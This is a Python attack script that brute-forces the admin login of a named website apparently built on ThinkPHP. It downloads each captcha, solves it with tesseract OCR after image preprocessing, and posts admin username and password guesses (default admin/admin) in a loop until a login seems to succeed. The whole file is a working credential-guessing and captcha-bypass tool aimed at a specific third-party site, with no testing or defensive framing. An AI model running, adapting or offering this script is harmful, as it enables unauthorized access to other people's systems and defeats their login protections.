#!/usr/bin/env python3
"""ThinkPHP验证码爆破 - 自动下载/识别/登录"""
import urllib.request, http.cookiejar, re, subprocess, io, time
from PIL import Image, ImageOps

TARGET = "http://www.str.org.cn"
LOGIN_URL = TARGET + "/public/index.php/admin/login/login"
CAPTCHA_URL = TARGET + "/public/index.php/captcha"

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
opener.addheaders = [("User-Agent", "Mozilla/5.0")]

def get_captcha():
    for i in range(3):
        try:
            data = opener.open(CAPTCHA_URL, timeout=8).read()
            if len(data) > 100:
                return data
        except: pass
    return None

def ocr(img_bytes):
    """预处理+tesseract识别"""
    try:
        img = Image.open(io.BytesIO(img_bytes)).convert("L")
        # 放大4倍
        img = img.resize((img.width*4, img.height*4), Image.LANCZOS)
        # 二值化
        img = img.point(lambda x: 0 if x < 150 else 255)
        img.save("/tmp/cap_proc.png")
        r = subprocess.run(["tesseract", "/tmp/cap_proc.png", "stdout", "--psm", "7",
                            "-c", "tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"],
                           capture_output=True, timeout=10)
        txt = r.stdout.decode().strip().replace(" ", "")
        if len(txt) == 4:
            return txt
        # psm 8 备选
        r = subprocess.run(["tesseract", "/tmp/cap_proc.png", "stdout", "--psm", "8",
                            "-c", "tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz"],
                           capture_output=True, timeout=10)
        txt = r.stdout.decode().strip().replace(" ", "")
        return txt if len(txt) == 4 else None
    except:
        return None

def try_login(username, password, code):
    data = f"username={username}&password={password}&code={code}&btnSubmit=1".encode()
    try:
        resp = opener.open(urllib.request.Request(LOGIN_URL, data=data), timeout=8)
        body = resp.read().decode("utf-8", "ignore")
        return body
    except Exception as e:
        return str(e)

# 主循环
import sys
password = sys.argv[1] if len(sys.argv) > 1 else "admin"
username = sys.argv[2] if len(sys.argv) > 2 else "admin"
max_try = 50

for i in range(max_try):
    cap = get_captcha()
    if not cap: continue
    code = ocr(cap)
    if not code:
        print(f"[{i}] OCR失败", flush=True)
        continue
    body = try_login(username, password, code)
    if "验证码" in body:
        print(f"[{i}] code={code} 验证码错误", flush=True)
    elif "密码" in body or "用户" in body or "success" in body.lower():
        print(f"[{i}] code={code} -> {body[:100]}", flush=True)
        if "success" in body.lower() or "成功" in body:
            print(f"!!! 登录成功: {username}/{password}", flush=True)
            break
    else:
        print(f"[{i}] code={code} -> {body[:150]}", flush=True)
        # 可能是登录成功或跳转
        if len(body) < 200 or "login" not in body.lower():
            print(f"!!! 异常响应，可能成功: {body[:200]}", flush=True)
            break
    time.sleep(0.3)
print("DONE")
